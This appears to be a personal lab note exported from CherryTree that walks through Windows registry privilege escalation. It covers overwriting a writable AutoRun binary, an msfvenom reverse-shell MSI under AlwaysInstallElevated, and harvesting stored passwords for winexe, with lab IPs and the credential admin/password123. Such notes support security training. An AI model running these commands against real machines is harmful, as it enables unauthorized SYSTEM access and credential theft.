<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Registry</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Registry</h1><br/><strong><h1>Registry Vulnerability/Exploits</h1></strong><br /><br /><br /><strong><h2>A) Autoruns</h2></strong><br /><br />Query the registry for AutoRun executables:<br /><br /><strong>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</strong><br /><br />Using <strong>accesschk.exe</strong>, note that one of the AutoRun executables is writable by everyone:<br /><br /><strong>C:\PrivEsc\accesschk.exe /accepteula -qwvu &quot;C:\Program Files\Autorun Program\program.exe&quot;</strong><br /><br />Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:<br /><br /><strong>copy C:\PrivEsc\reverse.exe &quot;C:\Program Files\Autorun Program\program.exe&quot; /Y</strong><br /><br />Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!<br /><br /><strong>rdesktop 10.10.151.95</strong><br />or <br /><strong>xfreerdp 10.10.151.95</strong><br /><br /><br /><br /><strong><h2>B) AlwaysInstallElevated</h2></strong><br /><br />Query the registry for <strong>AlwaysInstallElevated</strong> keys:<br /><br /><strong>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br />reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</strong><br /><br /><strong>Note</strong> that both keys are set to 1 (0x1). (Its required for this method that <strong>both</strong> are <strong>enabled</strong>)<br /><br />On Kali, generate a <strong>reverse shell Windows Installer</strong> (<strong>reverse.msi</strong>) using msfvenom. Update the LHOST IP address accordingly:<br /><br /><strong>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=5555 -f msi -o reverse.msi</strong><br /><br />Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).<br /><br />Start a <strong>listener</strong> on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:<br /><br /><strong>msiexec /quiet /qn /i C:\PrivEsc\reverse.msi</strong><br /><br /><br /><br /><strong><h2>C) Passwords in Registry</h2></strong><br /><br />The <strong>registry</strong> can be <strong>searched</strong> for keys and values that contain the word &quot;<strong>password</strong>&quot;:<br /><br /><strong>reg query HKLM /f password /t REG_SZ /s</strong><br /><br />If you want to save some time, query this specific key to find admin AutoLogon credentials:<br /><br /><strong>reg query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon&quot;</strong><br /><br />On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):<br /><br /><strong>winexe -U &#39;admin%password&#39; //10.10.77.255 cmd.exe</strong><br /><br /><br /><strong><h2>END</h2></strong></div>
</body>
</html>
